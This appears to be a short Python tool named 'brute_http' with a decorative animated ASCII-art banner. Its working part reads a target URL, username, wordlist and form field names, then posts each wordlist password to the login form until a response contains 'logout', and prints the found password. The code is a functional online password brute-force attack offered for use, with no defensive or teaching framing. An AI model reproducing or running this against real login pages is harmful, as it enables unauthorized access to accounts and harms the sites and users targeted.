import os
import sys
import time

import requests


def clear():
    os.system("cls" if os.name == "nt" else "clear")


TITLE = 'brute_http  "by fckmott"'

W1 = "\033[97m"
W2 = "\033[33m"
W3 = "\033[2;33m"
RD = "\033[91m"
GR = "\033[90m"
RS = "\033[0m"
BLD = "\033[1m"

GUN = [
    (W3, "  ██▄                             ▄██  "),
    (W3, " ████▄                           ▄████ "),
    (W2, "██████▄                         ▄██████"),
    (W2, " ▀█████▄                       ▄█████▀ "),
    (W1, "   ▀████▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄████▀   "),
    (GR, ""),
    (W3, "       ▄▄████████████████████████▄▄       "),
    (W2, "     ▄██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▄     "),
    (W1, "    ██▓▓░░░░░░░░░░░░░░░░░░░░░░░░▓▓██    "),
    (W1, "   ██▓░░  ██            ██  ░░░░░▓▓██   "),
    (W1, "   ██▓░░  ██   ██████   ██  ░░░░░▓▓██   "),
    (W2, "   ██▓░░  ▀▀   ██  ██   ▀▀  ░░░░░▓▓██   "),
    (W1, "   ██▓░░       ██  ██       ░░░░░▓▓██   "),
    (W1, "   ██▓▓░░░░░░░░░░░░░░░░░░░░░░░░░▓▓██   "),
    (W2, "    ██▓▓▓░░░░░░░░░░░░░░░░░░░░▓▓▓██    "),
    (W3, "     ████▓▓▓░░░░░░░░░░░░░░▓▓▓████     "),
    (GR, ""),
    (W2, "      ▄████▄     ██     ▄████▄      "),
    (W1, "     ██▓▓▓▓██   ████   ██▓▓▓▓██     "),
    (W2, "     ██▓░░▓██  ██████  ██▓░░▓██     "),
    (W3, "      ▀████▀  ▀██  ██▀  ▀████▀      "),
    (GR, ""),
    (RD, "       ▄████████████████████▄        "),
    (RD, "      ██brute_http v1.0 by▓██       "),
    (RD, "       ▀████████████████████▀        "),
]


def brute_http_intro():
    clear()
    print("\n")
    sys.stdout.write(f"  {RD}{BLD}")
    for ch in TITLE:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(0.04)
    print(RS + "\n")
    time.sleep(0.3)

    for color, row in GUN:
        print(f"  {color}{row}{RS}")
        time.sleep(0.07)

    time.sleep(0.2)
    sys.stdout.write(f"\033[2K\r  {RD}{'█' * 44}{RS}")
    sys.stdout.flush()
    time.sleep(0.07)
    sys.stdout.write(f"\033[2K\r")
    sys.stdout.flush()
    print("\n")


if __name__ == "__main__":
    brute_http_intro()
###############################################################
url = sys.argv[1]
usuario = sys.argv[2]
wordlist = sys.argv[3]
user_parameter = sys.argv[4]
password_parameter = sys.argv[5]

with open(wordlist, "r", encoding="latin-1") as f:
    for item in f:
        senha = item.strip()

        dados = {user_parameter: usuario, password_parameter: senha}

        response = requests.post(url, data=dados)
        if "logout" in response.text:
            print("senha encontrada")
            print("############")
            print(f"{senha}")
            exit()
        else:
            print(f"tentativa {senha}")
